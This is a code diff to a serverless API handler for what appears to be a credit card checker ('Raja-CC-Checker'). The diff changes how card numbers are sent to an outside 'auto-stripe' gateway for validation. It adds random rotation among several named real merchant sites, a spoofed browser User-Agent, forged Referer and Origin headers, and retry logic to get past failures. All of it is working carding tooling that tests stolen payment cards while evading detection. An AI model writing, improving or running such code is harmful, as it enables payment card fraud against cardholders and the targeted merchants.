@@ -23,8 +23,17 @@ export default async function handler(req, res) {
 
     const { cc, username: requestUsername, userBotToken, userChatId } = body;
     
-    // Set default site since it's not being sent from frontend
-    const site = 'buildersdiscountwarehouse.com';
+    // Try different sites for better success rate
+    const sites = [
+      'buildersdiscountwarehouse.com',
+      'streetzfinest.com',
+      'thefeednaturalmarket.com',
+      'littlewoods.com'
+    ];
+    
+    // Use random site for each check
+    const site = sites[Math.floor(Math.random() * sites.length)];
+    console.log('🌐 Using site:', site);
 
     console.log('📝 Extracted parameters:', { 
       cc: cc ? cc.substring(0, 4) + '****' : 'MISSING', 
@@ -97,18 +106,59 @@ export default async function handler(req, res) {
     // Build API URL
     const apiUrl = `https://darkboy-auto-stripe.onrender.com/gateway=autostripe/key=darkboy/site=${encodeURIComponent(site)}/cc=${encodeURIComponent(cc)}`;
     
-    // Make request to external API
-    const response = await fetch(apiUrl, {
-      method: 'GET',
-      headers: {
-        'Accept': 'application/json',
-        'User-Agent': 'Raja-CC-Checker/2.0 (Vercel Proxy)',
-        'Cache-Control': 'no-cache'
-      }
-    });
+    console.log('🔗 API URL:', apiUrl);
+    
+    // Make request to external API with retry logic
+    let response, responseText;
+    let attempts = 0;
+    const maxAttempts = 3;
+    
+    while (attempts < maxAttempts) {
+      attempts++;
+      console.log(`🔄 Attempt ${attempts}/${maxAttempts}`);
+      
+      try {
+        response = await fetch(apiUrl, {
+          method: 'GET',
+          headers: {
+            'Accept': 'application/json, text/plain, */*',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+            'Cache-Control': 'no-cache',
+            'Connection': 'keep-alive',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Referer': `https://${site}/`,
+            'Origin': `https://${site}`
+          },
+          timeout: 30000
+        });
 
-    const responseText = await response.text();
-    console.log('Raw API Response:', responseText);
+        responseText = await response.text();
+        console.log(`📊 Attempt ${attempts} - Status:`, response.status);
+        console.log('📝 Raw API Response:', responseText);
+        
+        // If we get a valid response, break the loop
+        if (response.ok && responseText && !responseText.includes('Failed to extract nonce')) {
+          break;
+        }
+        
+        // If this was the last attempt or we got a good response, don't retry
+        if (attempts >= maxAttempts) {
+          break;
+        }
+        
+        // Wait before retry
+        console.log('⏳ Waiting before retry...');
+        await new Promise(resolve => setTimeout(resolve, 2000));
+        
+      } catch (error) {
+        console.log(`❌ Attempt ${attempts} failed:`, error.message);
+        if (attempts >= maxAttempts) {
+          throw error;
+        }
+        await new Promise(resolve => setTimeout(resolve, 2000));
+      }
+    }
     
     let jsonResult;
     
